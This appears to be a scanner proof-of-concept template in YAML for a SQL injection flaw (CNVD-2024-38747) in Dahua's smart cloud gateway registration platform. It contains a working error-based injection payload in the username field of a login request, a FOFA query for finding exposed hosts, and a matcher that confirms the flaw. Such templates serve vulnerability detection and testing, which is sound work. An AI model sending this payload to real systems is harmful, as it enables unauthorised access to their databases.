id: poc-yaml-dahuatech-sqli-cnvd-2024-38747
info:
  name: 大华智能云网关注册管理平台 SQL注入漏洞(CNVD-2024-38747)
  severity: high
  tags:
  - sql-injection
  - CNVD-2024-38747
  finger: 大华智能云网关注册管理平台
  fofa: title="智能云网关注册管理平台"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /index.php/User/doLogin
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: username=1')and+updatexml(1,concat(0x7e,md5({{.t1}}),0x7e),1)--+&password=
  expression: status_code == 404 && contains(body,"XPATH syntax error:") && contains(body,substr(t2,0,31))
    && contains(body,"SQL语句")
transport: http
